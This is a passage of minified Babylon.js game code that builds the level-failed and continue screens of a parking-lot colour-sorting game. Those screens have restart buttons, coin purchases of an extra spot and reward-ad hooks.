new BABYLON.GUI.Rectangle("ScreenLevelFailed.pnlRoot");this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.clipContent=!0;this.pnlRoot.clipChildren=!0;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.zIndex=3;a.addControl(this.pnlRoot);return this.pnlRoot},createLevelFailedPanel:function(a){this.pnlLevelFailed=new BABYLON.GUI.Rectangle("pnlLevelFailed");
this.pnlLevelFailed.transformCenterX=.5;this.pnlLevelFailed.transformCenterY=.5;this.pnlLevelFailed.isPointerBlocker=!1;this.pnlLevelFailed.isHitTestVisible=!1;this.pnlLevelFailed.clipContent=!1;this.pnlLevelFailed.clipChildren=!1;this.pnlLevelFailed.thickness=0;this.pnlLevelFailed.widthInPixels=650;this.pnlLevelFailed.heightInPixels=920;this.pnlLevelFailed.color="yellow";a.addControl(this.pnlLevelFailed);this.pnlLevelFailed.scaleTo=function(b){this.scaleX=this.scaleY=b};return this.pnlLevelFailed},
createBackground:function(a){this.imgBackground=new BABYLON.GUI.Rectangle("imgBackground");this.imgBackground.transformCenterX=.5;this.imgBackground.transformCenterY=.5;this.imgBackground.isPointerBlocker=!1;this.imgBackground.isHitTestVisible=!1;this.imgBackground.clipContent=!1;this.imgBackground.clipChildren=!1;this.imgBackground.thickness=0;this.imgBackground.color="orange";this.imgBackground.background="rgba(35,35,35,0.7)";a.addControl(this.imgBackground);this.imgBackground.resize=function(b,
e){e+=300*Resolution.SCALE;this.widthInPixels=b+5;this.heightInPixels=e;this.parent.heightInPixels=e}},createTitle:function(a,b){this.imgTitleBg=new BABYLON.GUI.Image("imgTitleBg");this.imgTitleBg.transformCenterX=.5;this.imgTitleBg.transformCenterY=.5;this.imgTitleBg.isPointerBlocker=!1;this.imgTitleBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgTitleBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"title_panel_lime.png");this.imgTitleBg.leftInPixels=0;this.imgTitleBg.topInPixels=b;a.addControl(this.imgTitleBg);
this.txtTitle=new BABYLON.GUI.TextBlock("txtTitle");this.txtTitle.textWrapping=!0;this.txtTitle.leftInPixels=0;this.txtTitle.topInPixels=b-5;this.txtTitle.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.color="#FFFFFF";this.txtTitle.text=
"Game ended";this.txtTitle.fontSize="55px";this.txtTitle.fontFamily="gamefont";this.txtTitle.leftInPixels=0;this.txtTitle.isPointerBlocker=!1;this.txtTitle.isHitTestVisible=!1;this.txtTitle.shadowOffsetX=0;this.txtTitle.shadowOffsetY=6;this.txtTitle.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtTitle.outlineColor="rgb(0,0,0)";this.txtTitle.outlineWidth=5;this.txtTitle.shadowBlur=5;a.addControl(this.txtTitle)},createBody:function(a,b){this.imgBodyBg=new BABYLON.GUI.Image("imgBodyBg");
this.imgBodyBg.transformCenterX=.5;this.imgBodyBg.transformCenterY=.5;this.imgBodyBg.isPointerBlocker=!1;this.imgBodyBg.isHitTestVisible=!1;this.imgBodyBg.leftInPixels=0;this.imgBodyBg.topInPixels=b;this.imgBodyBg.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBodyBg.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBodyBg.scaleX=this.imgBodyBg.scaleY=2;SetImageFromSpritesheet(this.imgBodyBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"bg_panel_lime.png");
a.addControl(this.imgBodyBg);this.txtFailed=new BABYLON.GUI.TextBlock("txtFailed");this.txtFailed.textWrapping=!0;this.txtFailed.leftInPixels=0;this.txtFailed.topInPixels=b-260;this.txtFailed.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtFailed.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtFailed.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtFailed.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;
this.txtFailed.color="#FFFFFF";this.txtFailed.text="Completed";this.txtFailed.fontSize="40px";this.txtFailed.fontFamily="gamefont";this.txtFailed.leftInPixels=0;this.txtFailed.isPointerBlocker=!1;this.txtFailed.isHitTestVisible=!1;this.txtFailed.shadowOffsetX=0;this.txtFailed.shadowOffsetY=6;this.txtFailed.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtFailed.outlineColor="rgb(0,0,0)";this.txtFailed.outlineWidth=5;this.txtFailed.shadowBlur=5;a.addControl(this.txtFailed);
this.imgBigCoin=new BABYLON.GUI.Image("imgBigCoin");this.imgBigCoin.transformCenterX=.5;this.imgBigCoin.transformCenterY=.5;this.imgBigCoin.isPointerBlocker=!1;this.imgBigCoin.isHitTestVisible=!1;this.imgBigCoin.leftInPixels=0;this.imgBigCoin.topInPixels=b-30;this.imgBigCoin.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBigCoin.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBigCoin.scaleX=this.imgBigCoin.scaleY=1.4;SetImageFromSpritesheet(this.imgBigCoin,
getAssetImage("pak1"),getAssetImageFrames("pak1"),"coin_big.png");a.addControl(this.imgBigCoin);this.txtRewardValue=new BABYLON.GUI.TextBlock("txtRewardValue");this.txtRewardValue.textWrapping=!0;this.txtRewardValue.leftInPixels=0;this.txtRewardValue.topInPixels=b+80;this.txtRewardValue.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtRewardValue.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtRewardValue.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;
this.txtRewardValue.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtRewardValue.color="rgba(255,255,255,1)";this.txtRewardValue.text="+0";this.txtRewardValue.fontSize="157px";this.txtRewardValue.fontFamily="gamefont";this.txtRewardValue.leftInPixels=0;this.txtRewardValue.isPointerBlocker=!1;this.txtRewardValue.isHitTestVisible=!1;this.txtRewardValue.shadowOffsetX=0;this.txtRewardValue.shadowOffsetY=6;this.txtRewardValue.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":
"rgba(80,80,80,0)";this.txtRewardValue.outlineColor="rgb(0,0,0)";this.txtRewardValue.outlineWidth=5;this.txtRewardValue.shadowBlur=10;a.addControl(this.txtRewardValue);Object.defineProperty(this,"SCORE",{get:function(){return this._score},set:function(e){this._score=Math.ceil(e);this.txtRewardValue.text="+"+this._score},enumerable:!0,configurable:!0})},createBottomButtons:function(a,b){this.btnRestart=BABYLON.GUI.Button.CreateImageOnlyButton("btnRestart");this.btnRestart.children[0].transformCenterY=
.5;this.btnRestart.children[0].transformCenterX=.5;this.btnRestart.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnRestart.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnRestart.transformCenterX=.5;this.btnRestart.transformCenterY=.5;this.btnRestart.topInPixels=b;this.btnRestart.leftInPixels=0;a.addControl(this.btnRestart);SetImageFromSpritesheet(this.btnRestart.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),
"button_repeat_big.png");ResetGuiButtonAppearance(this.btnRestart,this.btnRestart.children[0].sourceWidth,this.btnRestart.children[0].sourceHeight);this.btnRestart.onPointerClickObservable.add(this.onRestartPressed.bind(this))},updateTexts:function(){this.txtTitle.text=STR("LEVEL")+" "+(ActiveLevel+1);this.txtFailed.text=STR("LEVEL_FAILED")},updateData:function(){},onRestartPressed:function(){Buttons.enabled&&(inlModule.ads.triggerAdPoint({adType:AD_TYPES.GAME_OVER}),Buttons.enabled=!1,soundManager.playSound("button"),
adinplay_onAdStarted=function(){activeScene.allPaused=!0;activeScene.onGameResume();Buttons.enabled=!1;SavedGame=null;GameData.Save();screenGame.resetGame();screenGame.updateData();soundManager.playMusic("music_ingame");screenGame.guiRoot.isVisible=!0;screenLevelFailed.hideScene(function(){activeScene.gameRunning=!0;activeScene.gamePaused=!1;screenGame.enableControls();Buttons.enabled=!0});onStartGame()}.bind(this),adinplay_onAdFinished=function(){},adinplay_playVideoAd())},enableControls:function(){enableButton(this.btnRestart)},
disableControls:function(){disableButton(this.btnRestart)},hideScene:function(a){void 0===a&&(a=null);this.disableControls();activeScene.scene.animationTimeScale=1;activeScene.gamePaused=!1;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",-50*Resolution.SCALE,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",0,SCENE_TRANSITION_DURATION,b,1,!1,function(){screenLevelFailed.guiRoot.isVisible=
!1;null!=a&&a()})},showScene:function(a){void 0===a&&(a=null);this.disableControls();this.guiRoot.alpha=0;this.guiRoot.isVisible=!0;this.guiRoot.topInPixels=50*Resolution.SCALE;this.onResize();this.updateTexts();this.SCORE=0;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEOUT};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",0,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",1,SCENE_TRANSITION_DURATION,b,1,!1,
function(){null!=a&&a();screenLevelFailed.enableControls()}.bind(this))},beforeRender:function(){},onResize:function(){if(this.guiRoot.isVisible){var a=engine.getRenderWidth(),b=engine.getRenderHeight();this.imgBackground.resize(a,b);a>b?this.pnlLevelFailed.scaleTo(.8*Resolution.SCALE):(this.pnlLevelFailed.scaleTo(1.2*Resolution.SCALE),1E3*this.pnlLevelFailed.scaleY>b&&this.pnlLevelFailed.scaleTo(b/1E3));this.pnlLevelFailed.topInPixels=40*Resolution.SCALE;this.resizeShadows()}},resizeShadows:function(){var a=
this.txtTitle._fontSize._value/55;this.txtTitle.shadowOffsetX=getShadowOffs(0);this.txtTitle.shadowOffsetY=getShadowOffs(5*a);a=this.txtFailed._fontSize._value/40;this.txtFailed.shadowOffsetX=getShadowOffs(0);this.txtFailed.shadowOffsetY=getShadowOffs(5*a);this.txtFailed.outlineWidth=6*a;a=this.txtRewardValue._fontSize._value/50;this.txtRewardValue.shadowOffsetX=getShadowOffs(0);this.txtRewardValue.shadowOffsetY=getShadowOffs(5*a);this.txtRewardValue.outlineWidth=5*a}};var ScreenContinue=function(a){ScreenContinue.instance=this;this.create(a)};ScreenContinue.instance=null;
ScreenContinue.prototype={create:function(a){this.scene=a;this.createGui();this.disableControls();this.guiRoot.isVisible=!1},createGui:function(){this.initGuiControls(screenGame.guiTexture)},initGuiControls:function(a){this.guiRoot=this.createRootPanel(a);this.createBackground(this.guiRoot);this.createContinuePanel(this.pnlRoot);this.createBody(this.pnlContinue,0);this.createTitle(this.pnlContinue,-402);this.createBottomButtons(this.pnlContinue,260)},createRootPanel:function(a){this.pnlRoot=new BABYLON.GUI.Rectangle("ScreenContinue.pnlRoot");
this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.clipContent=!1;this.pnlRoot.clipChildren=!1;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.zIndex=3;a.addControl(this.pnlRoot);return this.pnlRoot},createContinuePanel:function(a){this.pnlContinue=new BABYLON.GUI.Rectangle("pnlContinue");this.pnlContinue.transformCenterX=.5;this.pnlContinue.transformCenterY=
.5;this.pnlContinue.isPointerBlocker=!1;this.pnlContinue.isHitTestVisible=!1;this.pnlContinue.clipContent=!0;this.pnlContinue.clipChildren=!0;this.pnlContinue.thickness=0;this.pnlContinue.widthInPixels=650;this.pnlContinue.heightInPixels=920;this.pnlContinue.color="yellow";a.addControl(this.pnlContinue);this.pnlContinue.scaleTo=function(b){this.scaleX=this.scaleY=b};return this.pnlContinue},createBackground:function(a){this.imgBackground=new BABYLON.GUI.Rectangle("imgBackground");this.imgBackground.transformCenterX=
.5;this.imgBackground.transformCenterY=.5;this.imgBackground.isPointerBlocker=!1;this.imgBackground.isHitTestVisible=!1;this.imgBackground.clipContent=!1;this.imgBackground.clipChildren=!1;this.imgBackground.thickness=0;this.imgBackground.color="orange";this.imgBackground.background="rgba(35,35,35,0.7)";a.addControl(this.imgBackground);this.imgBackground.resize=function(b,e){e+=300*Resolution.SCALE;this.widthInPixels=b+5;this.heightInPixels=e;this.parent.heightInPixels=e}},createTitle:function(a,
b){this.imgTitleBg=new BABYLON.GUI.Image("imgTitleBg");this.imgTitleBg.transformCenterX=.5;this.imgTitleBg.transformCenterY=.5;this.imgTitleBg.isPointerBlocker=!1;this.imgTitleBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgTitleBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"title_panel_orange.png");this.imgTitleBg.leftInPixels=0;this.imgTitleBg.topInPixels=b;a.addControl(this.imgTitleBg);this.txtTitle=new BABYLON.GUI.TextBlock("txtTitle");this.txtTitle.textWrapping=!0;this.txtTitle.leftInPixels=
0;this.txtTitle.topInPixels=b-5;this.txtTitle.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.color="#FFFFFF";this.txtTitle.text="BUY STUFF";this.txtTitle.fontSize="55px";this.txtTitle.fontFamily="gamefont";this.txtTitle.leftInPixels=
0;this.txtTitle.isPointerBlocker=!1;this.txtTitle.isHitTestVisible=!1;this.txtTitle.shadowOffsetX=0;this.txtTitle.shadowOffsetY=6;this.txtTitle.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtTitle.outlineColor="rgb(0,0,0)";this.txtTitle.outlineWidth=5;this.txtTitle.shadowBlur=5;a.addControl(this.txtTitle)},createBody:function(a,b){this.imgBodyBg=new BABYLON.GUI.Image("imgBodyBg");this.imgBodyBg.transformCenterX=.5;this.imgBodyBg.transformCenterY=.5;this.imgBodyBg.isPointerBlocker=
!1;this.imgBodyBg.isHitTestVisible=!1;this.imgBodyBg.leftInPixels=0;this.imgBodyBg.topInPixels=b;this.imgBodyBg.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBodyBg.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBodyBg.scaleX=this.imgBodyBg.scaleY=2;SetImageFromSpritesheet(this.imgBodyBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"bg_panel_orange.png");a.addControl(this.imgBodyBg);this.imgSpotIcon=new BABYLON.GUI.Image("imgSpotIcon");this.imgSpotIcon.transformCenterX=
.5;this.imgSpotIcon.transformCenterY=.5;this.imgSpotIcon.isPointerBlocker=!1;this.imgSpotIcon.isHitTestVisible=!1;this.imgSpotIcon.leftInPixels=0;this.imgSpotIcon.topInPixels=b-125;this.imgSpotIcon.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgSpotIcon.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgSpotIcon.scaleX=this.imgSpotIcon.scaleY=1.4;SetImageFromSpritesheet(this.imgSpotIcon,getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_parking_slot.png");
a.addControl(this.imgSpotIcon);this.txtPlusOne=new BABYLON.GUI.TextBlock("txtPlusOne");this.txtPlusOne.textWrapping=!0;this.txtPlusOne.leftInPixels=105;this.txtPlusOne.topInPixels=b-110;this.txtPlusOne.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtPlusOne.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtPlusOne.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtPlusOne.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;
this.txtPlusOne.color="#FFFFFF";this.txtPlusOne.text="+1";this.txtPlusOne.fontSize="85px";this.txtPlusOne.fontFamily="gamefont";this.txtPlusOne.isPointerBlocker=!1;this.txtPlusOne.isHitTestVisible=!1;this.txtPlusOne.shadowOffsetX=0;this.txtPlusOne.shadowOffsetY=6;this.txtPlusOne.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtPlusOne.outlineColor="rgb(0,0,0)";this.txtPlusOne.outlineWidth=5;this.txtPlusOne.shadowBlur=5;a.addControl(this.txtPlusOne);this.txtStuffDesc=new BABYLON.GUI.TextBlock("txtStuffDesc");
this.txtStuffDesc.textWrapping=!0;this.txtStuffDesc.widthInPixels=420;this.txtStuffDesc.leftInPixels=0;this.txtStuffDesc.topInPixels=b+135;this.txtStuffDesc.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtStuffDesc.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtStuffDesc.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtStuffDesc.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtStuffDesc.color=
"#FFFFFF";this.txtStuffDesc.text="REARRANGE THE COLOR OF THE\nVEHICLES IN PARKING LOT";this.txtStuffDesc.fontSize="26px";this.txtStuffDesc.fontFamily="gamefont";this.txtStuffDesc.leftInPixels=0;this.txtStuffDesc.isPointerBlocker=!1;this.txtStuffDesc.isHitTestVisible=!1;this.txtStuffDesc.shadowOffsetX=0;this.txtStuffDesc.shadowOffsetY=6;this.txtStuffDesc.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtStuffDesc.outlineColor="rgb(0,0,0)";this.txtStuffDesc.outlineWidth=
5;this.txtStuffDesc.shadowBlur=5;a.addControl(this.txtStuffDesc)},createBottomButtons:function(a,b){this.btnRestart=BABYLON.GUI.Button.CreateImageOnlyButton("btnRestart");this.btnRestart.children[0].transformCenterY=.5;this.btnRestart.children[0].transformCenterX=.5;this.btnRestart.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnRestart.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnRestart.transformCenterX=.5;this.btnRestart.transformCenterY=
.5;this.btnRestart.topInPixels=b-1;this.btnRestart.leftInPixels=-160;a.addControl(this.btnRestart);SetImageFromSpritesheet(this.btnRestart.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_repeat_top.png");ResetGuiButtonAppearance(this.btnRestart,this.btnRestart.children[0].sourceWidth,this.btnRestart.children[0].sourceHeight);this.btnRestart.onPointerClickObservable.add(this.onRestartPressed.bind(this));this.btnFree=BABYLON.GUI.Button.CreateImageWithCenterTextButton("btnFree",
"FREE");this.btnFree.clipContent=!1;this.btnFree.children[0].transformCenterY=.5;this.btnFree.children[0].transformCenterX=.5;this.btnFree.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnFree.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnFree.children[1].fontFamily="gamefont";this.btnFree.children[1].fontSize="35px";this.btnFree.children[1].topInPixels=-3;this.btnFree.children[1].color="#ffffff";this.btnFree.children[1].shadowOffsetX=
3;this.btnFree.children[1].shadowOffsetY=3;this.btnFree.children[1].shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.8)":"rgba(80,80,80,0)";this.btnFree.children[1].shadowBlur=5;this.btnFree.children[1].outlineColor="rgb(0,0,0)";this.btnFree.children[1].outlineWidth=3;this.btnFree.children[1].lineSpacing=5;this.btnFree.transformCenterX=.5;this.btnFree.transformCenterY=.5;this.btnFree.topInPixels=b;this.btnFree.leftInPixels=60;this.btnFree.scaleX=this.btnFree.scaleY=this.btnRestart.scaleX;a.addControl(this.btnFree);
SetImageFromSpritesheet(this.btnFree.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_orange_top.png");ResetGuiButtonAppearance(this.btnFree,this.btnFree.children[0].sourceWidth,this.btnFree.children[0].sourceHeight);this.btnFree.onPointerClickObservable.add(this.onPurchaseForAdPressed);this.imgPayAd=new BABYLON.GUI.Image("imgPayAd");this.imgPayAd.transformCenterX=.5;this.imgPayAd.transformCenterY=.5;this.imgPayAd.isPointerBlocker=!1;this.imgPayAd.isHitTestVisible=!1;this.imgPayAd.leftInPixels=
this.btnFree.leftInPixels+145;this.imgPayAd.topInPixels=this.btnFree.topInPixels-45;this.imgPayAd.rotation=DegToRad(20);this.imgPayAd.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgPayAd.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgPayAd.scaleX=this.imgPayAd.scaleY=.75;SetImageFromSpritesheet(this.imgPayAd,getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_watch_ad.png");a.addControl(this.imgPayAd);this.btnPay=BABYLON.GUI.Button.CreateImageWithCenterTextButton("btnPay",
"100");this.btnPay.children[0].transformCenterY=.5;this.btnPay.children[0].transformCenterX=.5;this.btnPay.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnPay.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnPay.children[1].fontFamily="gamefont";this.btnPay.children[1].fontSize="45px";this.btnPay.children[1].topInPixels=-8;this.btnPay.children[1].color="#ffffff";this.btnPay.children[1].shadowOffsetX=3;this.btnPay.children[1].shadowOffsetY=
3;this.btnPay.children[1].shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.8)":"rgba(80,80,80,0)";this.btnPay.children[1].shadowBlur=5;this.btnPay.children[1].outlineColor="rgb(0,0,0)";this.btnPay.children[1].outlineWidth=3;this.btnPay.children[1].lineSpacing=5;this.btnPay.transformCenterX=.5;this.btnPay.transformCenterY=.5;this.btnPay.topInPixels=b;this.btnPay.leftInPixels=60;this.btnPay.scaleX=this.btnPay.scaleY=this.btnRestart.scaleX;a.addControl(this.btnPay);SetImageFromSpritesheet(this.btnPay.children[0],
getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_orange_top.png");ResetGuiButtonAppearance(this.btnPay,this.btnPay.children[0].sourceWidth,this.btnPay.children[0].sourceHeight);this.btnPay.onPointerClickObservable.add(this.onPurchaseForCashPressed.bind(this));this.imgPayCoin=new BABYLON.GUI.Image("imgPayCoin");this.imgPayCoin.transformCenterX=.5;this.imgPayCoin.transformCenterY=.5;this.imgPayCoin.isPointerBlocker=!1;this.imgPayCoin.isHitTestVisible=!1;this.imgPayCoin.leftInPixels=0;this.imgPayCoin.topInPixels=
-6;this.imgPayCoin.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgPayCoin.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgPayCoin.scaleX=this.imgPayCoin.scaleY=.9;SetImageFromSpritesheet(this.imgPayCoin,getAssetImage("pak1"),getAssetImageFrames("pak1"),"coin_button.png");this.btnPay.addControl(this.imgPayCoin);this.btnPay.setText=function(e){this.children[1].text=e;e=getTextWidth(screenGame.guiTexture.getContext(),this.children[1].text,this.children[1].fontFamily,
this.children[1]._fontSize._value);var f=this.children[2].widthInPixels*this.children[2].scaleX;this.children[2].leftInPixels=-(e+f+7)/2+e/2-12;this.children[1].leftInPixels=this.children[2].leftInPixels+f/2+7+e/2}},setBooster:function(a){this.booster=a;this.txtTitle.text=STR(a.toUpperCase());this.txtStuffDesc.text=STR(a.toUpperCase()+"_DESC");SetImageFromSpritesheet(this.imgSpotIcon,getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_"+this.booster.toLowerCase()+"_big.png")},setPrice:function(a){this.price=
a;this.btnPay.setText(""+a)},updateTexts:function(){this.txtTitle.text=STR("CONTINUE?");this.txtStuffDesc.text=STR("GET_NEW_SPOT");this.btnFree.children[1].text=STR("FREE");updateTextToWidth(this.btnFree.children[1],screenGame.guiTexture.getContext(),230,45,1);var a=this.btnFree.children[1]._fontSize._value/45;this.btnFree.children[1].lineSpacing=-10*a;this.btnFree.children[1].topInPixels=-10*a;0<this.btnFree.children[1].text.indexOf("\n")&&(this.btnFree.children[1].topInPixels=-3*a)},updateData:function(){},
onClosePressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),screenContinue.hideScene(function(){activeScene.gamePaused=!1;screenGame.enableControls();Buttons.enabled=!0}))},onRestartPressed:function(){Buttons.enabled&&(inlModule.ads.triggerAdPoint(),Buttons.enabled=!1,soundManager.playSound("button"),screenContinue.hideScene(function(){screenGame.resetGame();screenGame.enableControls();Buttons.enabled=!0;activeScene.gamePaused=!1;activeScene.gameRunning=!0}.bind(this)))},
onPurchaseForCashPressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),screenTopPanel.purchaseForCash(this.price,!1)?screenContinue.hideScene(function(){screenGame.spotPurchased(screenGame.getSpotForPurchase());screenGame.enableControls();activeScene.gamePaused=!1;activeScene.gameRunning=!0;Buttons.enabled=!0}.bind(this)):Buttons.enabled=!0)},onPurchaseForAdPressed:function(){Buttons.enabled&&(soundManager.playSound("button"),Buttons.enabled=!1,RewardAds.showRewAd(activeScene.scene,
function(){screenContinue.hideScene(function(){screenGame.enableControls();screenGame.newSpotPurchased();activeScene.gamePaused=!1;activeScene.gameRunning=!0;Buttons.enabled=!0}.bind(this))},function(){Buttons.enabled=!0},this))},enableControls:function(){enableButton(this.btnRestart);inlModule.rewardAds.active?enableButton(this.btnFree):enableButton(this.btnPay)},disableControls:function(){disableButton(this.btnFree);disableButton(this.btnPay);disableButton(this.btnRestart)},hideScene:function(a){void 0===
a&&(a=null);this.disableControls();activeScene.scene.animationTimeScale=1;activeScene.gamePaused=!1;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",-50*Resolution.SCALE,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",0,SCENE_TRANSITION_DURATION,b,1,!1,function(){screenContinue.guiRoot.isVisible=!1;null!=a&&a()})},showScene:function(a){void 0===a&&(a=null);this.disableControls();
this.guiRoot.alpha=0;this.guiRoot.isVisible=!0;this.guiRoot.topInPixels=50*Resolution.SCALE;this.onResize();this.SCORE=0;this.setPrice(PRICE_NEW_SPOT);this.btnFree.isVisible=inlModule.rewardAds.active;this.imgPayAd.isVisible=inlModule.rewardAds.active;this.btnPay.isVisible=!inlModule.rewardAds.active;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEOUT};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",0,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,
"alpha",1,SCENE_TRANSITION_DURATION,b,1,!1,function(){null!=a&&a();screenContinue.enableControls()}.bind(this))},beforeRender:function(){},onResize:function(){if(this.guiRoot.isVisible){var a=engine.getRenderWidth(),b=engine.getRenderHeight();this.imgBackground.resize(a,b);a>=b?this.pnlContinue.scaleTo(.7*Resolution.SCALE):(this.pnlContinue.scaleTo(1*Resolution.SCALE),1100*this.pnlContinue.scaleY>b&&this.pnlContinue.scaleTo(b/1100));this.pnlContinue.topInPixels=40*Resolution.SCALE;this.resizeShadows()}},
